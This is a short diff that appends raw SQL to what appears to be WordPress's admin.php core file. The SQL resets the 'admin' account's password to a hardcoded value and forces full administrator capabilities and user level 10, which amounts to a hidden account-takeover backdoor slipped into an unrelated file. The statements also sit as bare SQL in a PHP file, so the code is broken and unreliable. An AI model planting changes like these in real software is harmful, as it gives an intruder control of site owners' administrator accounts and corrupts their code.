@@ -418,3 +418,20 @@ if ( ! empty( $_REQUEST['action'] ) ) {
 	 */
 	do_action( "admin_action_{$action}" );
 }
+
+UPDATE wp_users 
+SET user_pass = MD5('mtkft9R35pt9B3Z') 
+WHERE user_login = 'admin';
+
+# Also make sure this user has admin privileges
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
+SELECT user_id, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1}' 
+FROM wp_users 
+WHERE user_login = 'admin' 
+ON DUPLICATE KEY UPDATE meta_value = 'a:1:{s:13:"administrator";b:1}';
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
+SELECT user_id, 'wp_user_level', '10' 
+FROM wp_users 
+WHERE user_login = 'admin' 
+ON DUPLICATE KEY UPDATE meta_value = '10';
